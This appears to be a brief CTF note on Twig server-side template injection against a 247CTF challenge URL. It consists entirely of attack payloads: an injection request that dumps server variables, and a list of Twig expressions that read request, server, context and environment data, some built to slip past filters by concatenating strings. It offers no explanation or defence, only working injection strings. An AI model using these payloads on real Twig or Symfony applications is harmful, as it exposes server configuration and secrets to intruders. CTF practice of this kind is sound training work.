# Twig Injection

```jsx
https://cf126299fcc50fa1.247ctf.com/inject?inject={{%20app.request.server|join(%27,%20%27)%20}}
```

```jsx
Payload Ideas:

{{ app.request.server|join(' ') }}
{{ _self.app.request.server }}
{{ app.request.getHttpHost() }}
{{ app.request.getServerName() }}
{{ _context }}
{{ _self }}
{{ app.request.server }}
{{/*%20This%20is%20a%20comment%20*/}}{{%20_self%20}}
{{ app.request.server.get('HTTP_HOST') }}
{{ app.request.server|keys|first }}
{{ _self.env.get('request').server.all }}
{{ app.request.('ser' ~ 'ver').all }}
{{ app.request.server['HT' ~ 'TP_HOST'] }}
```